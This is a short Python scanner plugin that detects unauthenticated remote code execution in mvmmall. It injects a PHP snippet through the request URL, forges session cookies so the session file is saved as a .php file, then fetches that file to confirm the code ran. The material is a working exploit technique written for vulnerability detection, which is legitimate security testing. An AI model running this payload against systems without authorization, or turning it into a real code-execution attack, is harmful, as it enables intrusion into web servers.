#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#refer :http://www.wooyun.org/bugs/wooyun-2010-080042

def assign(service, arg):
    if service == "mvmmall":
        return True, arg

def audit(arg):
    url  = arg + "index.php?<?print(md5(0x22))?>"
    data = "'Cookie: sessionID=1.php;PHPSESSIN=1.php;\r\n'"
    code, head, res, errcode,finalurl =  curl.curl('"' + url + '"' + " -H " +data)

    checkURL = arg + "union/data/session/mvm_sess_1.php"
    code1, head1, res1, errcode1,finalurl1 =  curl.curl(checkURL)

    if res1.find("e369853df766fa44e1ed0ff613f563bd") != -1:
    	security_hole('mvmmall unauthentication remote code exec:' + checkURL)

if __name__ == '__main__':
    from dummy import *
    audit(assign('mvmmall', 'http://127.0.0.1/mvmmall/')[1])